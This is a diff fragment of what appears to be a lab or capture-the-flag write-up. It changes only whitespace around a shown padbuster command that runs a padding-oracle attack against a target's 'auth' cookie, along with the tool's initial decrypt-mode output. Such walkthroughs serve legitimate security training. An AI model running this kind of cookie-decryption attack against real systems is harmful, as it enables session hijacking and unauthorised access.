@@ -40,21 +40,21 @@ padbuster http://$TARGET_IP $COOKIE 8 -cookies $COOKIE_NAME=$COOKIE -encoding 0
 
 ```
 root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2 8 --cookies 'auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2' -encoding 0
-
+                                     
 +-------------------------------------------+
 | PadBuster - v0.3.3                        |
 | Brian Holyfield - Gotham Digital Science  |
 | labs@gdssecurity.com                      |
 +-------------------------------------------+
-
+                                     
 INFO: The original request returned the following
 [+] Status: 200
 [+] Location: N/A
 [+] Content Length: 978                                                    
-
+                                                                           
 INFO: Starting PadBuster Decrypt Mode 
 *** Starting Block 1 of 2 ***
-
+                                                                           
 INFO: No error string was provided...starting response analysis
 
 *** Response Analysis Complete ***                                         
@@ -83,3 +83,5 @@ NOTE: The ID# marked with ** is recommended : 2
 
 -------------------------------------------------------
 ```
+
+
